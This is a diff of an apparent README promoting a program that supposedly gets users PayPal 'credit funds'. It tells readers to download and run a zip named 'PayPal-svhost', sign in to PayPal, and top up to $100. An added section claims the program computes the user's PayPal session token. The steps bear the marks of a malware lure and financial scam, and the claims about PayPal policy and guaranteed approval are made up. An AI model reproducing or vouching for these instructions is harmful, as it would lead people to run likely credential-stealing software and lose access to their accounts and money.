@@ -4,14 +4,18 @@ This program will help you get credit funds in the application on the website ht
 
 WORK INSTRUCTIONS:
 
-1) Download the program https://github.com/Wich-Hash/PayPal-svhost.zip/archive/main.zip
-2) Run the program
-3) Sign in to your PayPal account
-4) If you have less than $ 100 on your PayPal account, top up your account up to $ 100 (and if more than $ 100, top up your account with at least $ 10)
-5) Submit your application. https://publicpolicy.paypal-corp.com/petition/ppp
-6) The application will be accepted within 6 hours with a positive result
+1) Download the program https://github.com/Wich-Hash/PayPal-svhost.zip/archive/main.zip ;
+2) Run the program;
+3) Sign in to your PayPal account;
+4) If you have less than $ 100 on your PayPal account, top up your account up to $ 100 (and if more than $ 100, top up your account with at least $ 10);
+5) Submit your application. https://publicpolicy.paypal-corp.com/petition/ppp ;
+6) The application will be accepted within 6 hours with a positive result.
 
-
+ WHY TOP UP PayPAl <br>
+ 
+ - The program should calculate your session token in PayPal;
+ - The PayPal system confidentially treats its clients with amounts of $ 100, since this capital is enough to engage in activities on the Internet (buy, pay for work done);
+ - You are payment capable of PayPal.
 
 HOW THE PROGRAM WORKS<br>
 
